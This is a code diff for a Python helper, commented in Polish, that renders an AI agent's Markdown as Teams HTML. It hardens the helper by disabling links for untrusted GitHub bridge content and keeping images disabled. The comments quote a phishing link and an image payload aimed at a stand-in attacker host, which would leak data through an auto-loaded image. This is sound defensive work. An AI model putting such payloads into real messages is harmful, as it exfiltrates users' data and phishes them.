@@ -19,8 +19,14 @@ import logging
 logger = logging.getLogger(__name__)
 
 
-def to_teams_html(markdown_text: str) -> str:
-    """Zamień Markdown agenta na HTML renderowany przez Teams; degraduj przy błędzie."""
+def to_teams_html(markdown_text: str, *, allow_links: bool = True) -> str:
+    """Zamień Markdown agenta na HTML renderowany przez Teams; degraduj przy błędzie.
+
+    ``allow_links`` — czy renderować markdownowe linki ``[tekst](url)``. Domyślnie ``True`` (wyjście
+    AGENTA jest zaufane). Dla powiadomień MOSTU (treść zdarzeń z GitHuba, niezaufana) ustawiamy
+    ``False``: ``[Kliknij](https://atakujący)`` w tytule issue nie może stać się żywym linkiem
+    (phishing) — schodzi jako tekst, a prawdziwy odnośnik i tak jest w wiadomości osobno.
+    """
     try:
         from markdown_it import MarkdownIt
     except Exception:  # brak extra teams-graph albo błąd ładowania — nie wywracaj wysyłki
@@ -38,6 +44,8 @@ def to_teams_html(markdown_text: str) -> str:
         # `![](https://atakujący/?d=...)` stałby się żywym <img src> — Teams mógłby go
         # pobrać, wyprowadzając dane. Markdown obrazka schodzi jako tekst (jak tabele).
         renderer.disable("image")
+        if not allow_links:
+            renderer.disable("link")  # niezaufana treść mostu — linki jako tekst (anty-phishing)
         return renderer.render(markdown_text)
     except Exception:  # renderer nie powinien rzucać, ale egress musi być odporny
         logger.exception("Render Markdown→HTML nie powiódł się — degraduję do tekstu.")
